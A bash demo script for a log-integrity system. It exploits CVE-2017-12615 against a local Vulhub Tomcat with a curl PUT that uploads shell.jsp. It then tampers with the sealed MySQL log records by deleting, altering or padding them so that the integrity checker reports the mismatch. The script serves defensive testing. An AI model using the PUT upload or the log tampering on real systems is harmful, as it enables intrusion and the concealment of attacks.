#!/usr/bin/env bash

set -Eeuo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_DIR="$(cd "${SCRIPT_DIR}/../.." && pwd)"
ENV_FILE="${1:-${REPO_DIR}/ops/vm-runtime.env}"

log() {
  printf '[%s] %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$*"
}

fail() {
  printf '[%s] ERROR: %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$*" >&2
  exit 1
}

load_env() {
  [[ -f "$ENV_FILE" ]] || fail "runtime env missing: ${ENV_FILE}"
  # shellcheck disable=SC1090
  set -a
  source "$ENV_FILE"
  set +a
}

set_defaults() {
  : "${LOGTRACE_BACKEND_URL:=http://127.0.0.1:8080}"
  : "${LOGTRACE_TOMCAT_URL:=http://127.0.0.1:18080}"
  : "${LOGTRACE_TOMCAT_LOG_DIR:=/opt/log-trace/vulhub-logs/tomcat}"
  : "${LOGTRACE_STAGE12_SOURCE:=tomcat-cve-2017-12615}"
  : "${LOGTRACE_STAGE12_FRONTEND_URL:=http://192.168.88.101:5173}"
  : "${LOGTRACE_STAGE12_ATTACK_WAIT_SECONDS:=60}"
  : "${LOGTRACE_STAGE12_MAX_WAIT_SECONDS:=480}"
  : "${LOGTRACE_STAGE12_POLL_SECONDS:=10}"
  : "${LOGTRACE_STAGE12_NOISE_COUNT:=20}"
  : "${LOGTRACE_STAGE12_TAMPER_MYSQL_CLI:=${LOGTRACE_STAGE11_TAMPER_MYSQL_CLI:-sudo mysql -Dlogtrace_node1}}"
  : "${LOGTRACE_NODE1_JDBC_USERNAME:=logtrace_app}"
  : "${LOGTRACE_NODE1_JDBC_PASSWORD:=123456}"
}

require_command() {
  command -v "$1" >/dev/null 2>&1 || fail "required command not found: $1"
}

mysql_query() {
  MYSQL_PWD="$LOGTRACE_NODE1_JDBC_PASSWORD" mysql \
    -N -B -h127.0.0.1 -u"$LOGTRACE_NODE1_JDBC_USERNAME" -Dlogtrace_node1 \
    -e "$1"
}

split_mysql_cli() {
  # shellcheck disable=SC2206
  MYSQL_ROOT_CLI=($LOGTRACE_STAGE12_TAMPER_MYSQL_CLI)
}

choose_tamper_mode() {
  if [[ -n "${LOGTRACE_STAGE12_TAMPER_MODE:-}" ]]; then
    TAMPER_MODE="$LOGTRACE_STAGE12_TAMPER_MODE"
  else
    printf '\nChoose tamper mode:\n'
    printf '  1) missing  - delete the attack log\n'
    printf '  2) modified - change the attack URI\n'
    printf '  3) extra    - insert many normal-looking noise logs\n'
    read -r -p 'Enter 1/2/3 or missing/modified/extra: ' answer
    case "$answer" in
      1|missing) TAMPER_MODE="missing" ;;
      2|modified) TAMPER_MODE="modified" ;;
      3|extra) TAMPER_MODE="extra" ;;
      *) fail "invalid tamper mode: ${answer}" ;;
    esac
  fi
  [[ "$TAMPER_MODE" =~ ^(missing|modified|extra)$ ]] || fail "invalid tamper mode: ${TAMPER_MODE}"
}

wait_for_fresh_window() {
  log "waiting for a fresh UTC minute window"
  local initial_minute
  initial_minute="$(date -u '+%Y-%m-%dT%H:%M')"
  while [[ "$(date -u '+%Y-%m-%dT%H:%M')" == "$initial_minute" ]]; do
    sleep 1
  done
  WINDOW_START="$(date -u '+%Y-%m-%dT%H:%M:00Z')"
  BATCH_ID="bch_v1_${LOGTRACE_STAGE12_SOURCE}_$(date -u '+%Y%m%dT%H%M00Z')"
  log "fresh window started: ${WINDOW_START}"
  log "expected batch_id: ${BATCH_ID}"
}

trigger_attack() {
  log "triggering attack PUT traffic"
  curl -i -X PUT "${LOGTRACE_TOMCAT_URL}/shell.jsp/" \
    -H 'Content-Range: bytes 0-5/6' \
    -H 'Content-Type: application/octet-stream' \
    -H 'User-Agent: Stage12AttackClient/1.0' \
    --data-binary '<%out.println("stage12");%>'
  log "recent Tomcat access log lines"
  tail -n 12 "${LOGTRACE_TOMCAT_LOG_DIR}"/localhost_access_log.*.txt | sed 's/^/[tomcat] /' || true
}

wait_for_attack_log() {
  log "waiting for attack log in node1.log_records"
  local elapsed=0
  while (( elapsed <= LOGTRACE_STAGE12_MAX_WAIT_SECONDS )); do
    ATTACK_LOG_ID="$(mysql_query "SELECT log_id
      FROM log_records
      WHERE batch_id='${BATCH_ID}' AND request_method='PUT' AND request_uri LIKE '%/shell.jsp%'
      ORDER BY inserted_at DESC
      LIMIT 1;" | head -n 1 || true)"
    if [[ -n "${ATTACK_LOG_ID:-}" ]]; then
      log "attack log found: ${ATTACK_LOG_ID}"
      return 0
    fi
    log "waiting for ingest... elapsed=${elapsed}s"
    sleep "$LOGTRACE_STAGE12_POLL_SECONDS"
    elapsed=$((elapsed + LOGTRACE_STAGE12_POLL_SECONDS))
  done
  fail "attack log was not ingested for ${BATCH_ID}"
}

wait_minimum_after_attack() {
  log "waiting at least ${LOGTRACE_STAGE12_ATTACK_WAIT_SECONDS}s before tampering"
  sleep "$LOGTRACE_STAGE12_ATTACK_WAIT_SECONDS"
}

wait_for_chain_committed() {
  log "waiting for ${BATCH_ID} to reach CHAIN_COMMITTED"
  local elapsed=0
  while (( elapsed <= LOGTRACE_STAGE12_MAX_WAIT_SECONDS )); do
    row="$(mysql_query "SELECT seal_status, COALESCE(chain_tx_id, '')
      FROM log_batches
      WHERE batch_id='${BATCH_ID}'
      LIMIT 1;" | head -n 1 || true)"
    if [[ -n "$row" ]]; then
      log "batch row: ${row}"
      if awk -F'\t' '{ exit ($1 == "CHAIN_COMMITTED" && length($2) > 0 ? 0 : 1) }' <<<"$row"; then
        CHAIN_TX_ID="$(awk -F'\t' '{print $2}' <<<"$row")"
        return 0
      fi
    fi
    log "waiting for seal... elapsed=${elapsed}s"
    sleep "$LOGTRACE_STAGE12_POLL_SECONDS"
    elapsed=$((elapsed + LOGTRACE_STAGE12_POLL_SECONDS))
  done
  fail "batch did not reach CHAIN_COMMITTED: ${BATCH_ID}"
}

tamper_database() {
  split_mysql_cli
  log "tampering node1 with mode=${TAMPER_MODE}"
  case "$TAMPER_MODE" in
    missing)
      "${MYSQL_ROOT_CLI[@]}" -e "CALL sp_tamper_delete_by_pattern('${BATCH_ID}', 'log_id', '${ATTACK_LOG_ID}', 'EQUAL');"
      ;;
    modified)
      "${MYSQL_ROOT_CLI[@]}" -e "CALL sp_tamper_update_by_pattern('${BATCH_ID}', 'log_id', '${ATTACK_LOG_ID}', 'EQUAL', 'request_uri', '/index.jsp');"
      ;;
    extra)
      "${MYSQL_ROOT_CLI[@]}" -e "CALL sp_tamper_insert_noise('${BATCH_ID}', ${LOGTRACE_STAGE12_NOISE_COUNT}, '/stage12-normal-looking');"
      ;;
  esac
}

print_summary() {
  cat <<EOF

Stage 12 attack/tamper completed

batch_id=${BATCH_ID}
attack_log_id=${ATTACK_LOG_ID}
tamper_mode=${TAMPER_MODE}
chain_tx_id=${CHAIN_TX_ID:-}

Open in browser:
  ${LOGTRACE_STAGE12_FRONTEND_URL}/integrity?batch_id=${BATCH_ID}
  ${LOGTRACE_STAGE12_FRONTEND_URL}/logs
  ${LOGTRACE_STAGE12_FRONTEND_URL}/batches/${BATCH_ID}

Expected integrity result:
  abnormal_nodes includes node1
  difference type includes $(case "$TAMPER_MODE" in missing) printf 'MISSING_LOG';; modified) printf 'MODIFIED_LOG';; extra) printf 'EXTRA_LOG';; esac)
  difference type includes BATCH_ROOT_MISMATCH
EOF
}

main() {
  load_env
  set_defaults
  require_command curl
  require_command mysql
  curl -fsS "${LOGTRACE_BACKEND_URL}/swagger-ui.html" >/dev/null || fail "backend is not reachable"
  curl -fsS "${LOGTRACE_TOMCAT_URL}/" >/dev/null || fail "Tomcat is not reachable"
  choose_tamper_mode
  wait_for_fresh_window
  trigger_attack
  wait_for_attack_log
  wait_minimum_after_attack
  wait_for_chain_committed
  tamper_database
  print_summary
}

main "$@"
